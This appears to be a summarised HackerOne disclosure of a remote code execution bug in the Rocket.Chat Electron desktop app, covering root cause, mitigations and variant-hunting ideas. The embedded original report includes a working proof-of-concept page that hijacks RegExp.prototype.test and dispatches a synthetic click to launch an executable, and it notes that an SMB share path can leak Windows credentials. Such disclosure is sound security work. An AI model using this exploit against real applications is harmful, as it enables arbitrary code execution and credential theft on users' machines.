# Desktop App RCE via RegExp.prototype Hijacking and dispatchEvent Bypass

## Metadata
- **Source:** HackerOne
- **Report:** 843171 | https://hackerone.com/reports/843171
- **Submitted:** 2020-04-08
- **Reporter:** ivarsvids
- **Program:** Rocket.Chat
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Remote Code Execution, Prototype Pollution, Improper Input Validation, Insufficient Context Isolation, Event Handling Bypass
- **CVEs:** None
- **Category:** memory-binary

## Summary
A critical RCE vulnerability in Rocket.Chat Electron desktop app (v2.17.9) allows attackers to execute arbitrary code by hijacking RegExp.prototype.test() method and synthesizing trusted click events to bypass URL validation in the links preload script. The vulnerability enables attackers to trigger shell.openExternal() with malicious URIs pointing to executables or SMB shares.

## Attack scenario
1. Attacker creates a malicious HTML page with embedded JavaScript
2. Attacker tricks victim into visiting the page or adding attacker's self-hosted Rocket.Chat server
3. JavaScript overrides RegExp.prototype.test() to return true for protocol validation regex
4. JavaScript creates an anchor element with href pointing to local executable (e.g., c:\windows\system32\calc.exe)
5. JavaScript mocks document.closest() to return the malicious anchor and dispatches synthetic click event
6. Preload script's event listener receives event and calls shell.openExternal() with attacker-controlled URI, executing arbitrary code

## Root cause
The preload script trusts synthetic click events without verifying isTrusted attribute and relies on RegExp validation that can be bypassed through prototype pollution. Lack of context isolation allows malicious scripts to modify built-in prototypes and inject code into the electron preload context.

## Attacker mindset
An attacker could compromise users through social engineering (deep-link clicks or server addition), leveraging the desktop app's privileged access to execute arbitrary code, steal Windows credentials via SMB shares, or establish persistent access to victim systems.

## Defensive takeaways
- Enable Electron context isolation to prevent malicious scripts from accessing and modifying preload script context
- Validate event.isTrusted property for all security-critical event handlers (though document this is not a complete mitigation)
- Implement Content Security Policy to restrict script execution and prototype modification
- Use immutable prototype methods or copy validation logic to local scope rather than relying on global RegExp
- Sanitize and validate all URLs before passing to shell.openExternal() using allowlist of protocols
- Implement additional user confirmation dialogs before executing shell.openExternal() on non-standard protocols
- Review electron security best practices: avoid eval, use sandbox attributes, validate all remote content

## Variant hunting
Check if other Electron apps using preload scripts for link handling have similar prototype pollution vulnerabilities
Test if Object.prototype or Function.prototype can be hijacked to bypass other security checks
Investigate if other event types (keydown, mousedown) can bypass isTrusted checks with synthesized events
Search for instances of shell.openExternal() calls in electron apps without protocol validation
Test if Proxy objects can be used instead of prototype pollution to intercept and spoof validation functions
Check if window.close(), window.open() or navigator methods have similar bypass vectors through preload scripts

## MITRE ATT&CK
- T1190
- T1566
- T1204
- T1559
- T1547

## Notes
This is a #276031 bypass, indicating a previous vulnerability was partially fixed but incompletely. Cross-platform impact potential on Linux and macOS with minor modifications. SMB share execution vector poses additional risk of credential harvesting through NTLM relay attacks. The sophisticated nature of the exploit (prototype hijacking + event spoofing + DOM mocking) suggests targeted attack potential rather than mass exploitation.

## Full report
<details><summary>Expand</summary>

**Summary:** #276031 fix bypass, two click remote code execution.

**Description:** The security issue is in links preload file https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/preload/links.js file.
By rewriting  `RegExp.prototype.test` method it is possible to prepare proper answers to get to the `shell.openExternal` method. To trigger  events attached by `addEventListener` you can use `dispatchEvent` method.

Note: for demo I pointed to `calc.exe`, it also cloud be pointed, to SMB share (example. `\\server\share\executable.exe`), which can lead to windows credential leak and attacker also can execute arbitrary code on victims machine.

i believe this issue is cross-platform, an can be exploited in Linux, MacOS with minor JavaScript modifications.

## Releases Affected:

  * Rocket.Chat.Electron 2.17.9 

## Steps To Reproduce (from initial installation to vulnerability):

  1. Create web page with following `index.html`
```
<html>
	<head>
	</head>
	<body style="background-color: white;" >
		<h1>Initializing surprise in 3, 2, 1</h1>
		<script>
			setTimeout(() => {
				// create link
				let a = document.createElement('A');
				a.setAttribute('href', 'c:\\windows\\system32\\calc.exe');

				// hooks regexp.test
				RegExp.prototype._test = RegExp.prototype._test || RegExp.prototype.test;
				RegExp.prototype.test = function(...args){
					return this.source === '^([a-z]+:)?\\/\\/' || this._test(...args);
				}
				
				// add missing method
				document.closest = () => a;

				// triger event
				document.dispatchEvent(new Event('click'));

				//cleanup
				RegExp.prototype.test = RegExp.prototype._test;
				delete RegExp.prototype._test;
			}, 100);
		</script>
	</body>
</html>
```
  2. create `api/info` which contains JSON, can be empty JSON.
  3. Add new server

## Supporting Material/References:

{F779066}

## Suggested mitigation

I understand that deep-links and `Add new server` are a features and not bugs
* The simplest fix would be to check `isTrusted` attribute for events, but I'm 100% certain that it can be bypassed.
* Enable context isolation (https://github.com/electron/electron/blob/master/docs/tutorial/security.md#3-enable-context-isolation-for-remote-content)

## Impact

An attacker can trick victim to click on deep-link or add self hosted server to desktop application, which leads to remote code execution. I understand that deep-links and/or self hosted servers are not a bug, but it can be used in attack vector.

</details>

---
*Analysed by Claude on 2026-05-12*
